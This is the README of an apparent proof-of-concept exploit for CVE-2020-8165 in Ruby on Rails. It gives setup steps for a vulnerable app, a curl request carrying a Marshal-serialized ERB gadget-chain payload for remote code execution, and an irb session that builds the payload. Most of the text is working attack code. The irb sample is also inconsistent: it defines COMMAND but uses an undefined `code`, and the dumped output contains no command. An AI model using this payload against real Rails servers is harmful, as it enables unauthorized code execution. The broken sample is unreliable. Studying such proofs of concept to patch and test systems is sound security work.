## CVE-2020-8165 (Ruby on Rails)

For educational purposes only.

See Reference for the details.

## Environment
Ruby: 2.6.3
Rails: 5.2.3

## RUN
```
$ git clone https://github.com/masahiro331/CVE-2020-8165.git
$ bundle install --path vendor/bundle
$ bundle exec rails db:migrate
$ bundle exec rails s

# use redis
$ docker run -d -p 6379:6379 redis
```

## Exploit
$ curl -X POST -H 'Content-Type: application/json' http://localhost:3000/users -d '\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\a:\x0E@filenameI\"\x061\x06:\x06ET:\f@linenoi\x06:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT'

## check local tmp directory
$ ls /tmp/rce

## Sample Create payload
```
$ bundle exec rails console

irb(main):001:0> COMMAND = '`touch /tmp/rce`'
irb(main):002:0> erb = ERB.allocate
irb(main):003:0> erb.instance_variable_set :@src, code
irb(main):004:0> erb.instance_variable_set :@filename, "1"
irb(main):005:0> erb.instance_variable_set :@lineno, 1
irb(main):006:0> Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
=> "\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\a:\x0E@filenameI\"\x061\x06:\x06ET:\f@linenoi\x06:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT"
```

## References
https://groups.google.com/forum/#!topic/ruby-security-ann/OEWeyjD7NHY

